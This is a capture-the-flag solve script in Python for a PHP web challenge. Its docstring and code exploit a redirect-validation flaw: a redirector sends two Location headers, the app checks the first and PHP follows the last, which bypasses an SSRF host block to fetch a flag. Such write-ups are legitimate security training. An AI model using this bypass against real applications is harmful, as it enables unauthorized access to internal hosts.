#!/usr/bin/env python3
"""get-file2 -- THJCC CTF 2026 Summer (web, 308 pts).

The sequel to get-file1. The case-sensitivity trick is patched (the app now
matches the redirect header case-insensitively), so this one is a
duplicate-`Location`-header *parser differential*.

file.php:
    1. blocks host flag.thjcc in the filter a().
    2. get_headers($s, follow_location=false); finds the redirect target
       case-insensitively but takes the FIRST Location and break-s:
           foreach ($h as $v)
               if (preg_match('/^Location:/i', $v)) { $n = ...; break; }   # first
           if ($n !== null && !a($n)) throw;                               # re-check
    3. file_get_contents($s) with a context that omits follow_location, so it
       defaults to TRUE -> PHP follows the redirect itself.

The redirector /a emits TWO Location headers:
       Location: http://r/x                    <- 1st, safe host 'r'
       Location: http://flag.thjcc/flag.txt    <- 2nd, the flag

The differential:
    * the app validates the FIRST header (http://r/x -> allowed), while
    * PHP's HTTP stream wrapper overwrites `location` on every Location line, so
      it follows the LAST one -> http://flag.thjcc/flag.txt, sending the required
      Host: flag.thjcc.

Validate-first vs follow-last -> the flag. One request:

    GET /file.php?u=http://r/a

    python3 solve.py [BASE_URL]
"""
from __future__ import annotations

import re
import sys
import urllib.parse
import urllib.request
import urllib.error

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chal.thjcc.org:8082"


def fetch(u: str) -> str:
    url = BASE + "/file.php?u=" + urllib.parse.quote(u, safe="")
    try:
        return urllib.request.urlopen(url, timeout=15).read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return f"[HTTP {e.code}] " + e.read().decode("utf-8", "replace")


def main() -> int:
    # single Location straight to the flag -> the app sees it, filter throws:
    print("[*] u=http://r/b  (single Location, the trap):", fetch("http://r/b").strip())

    # two Location headers: app validates the first (safe), PHP follows the last:
    body = fetch("http://r/a")
    print(f"[*] u=http://r/a  (dual Location, the bypass): {body.strip()}")
    m = re.search(r"THJCC\{[^}]*\}", body)
    if m:
        print(f"\n[+] flag: {m.group(0)}")
        return 0
    print("\n[-] no flag recovered")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
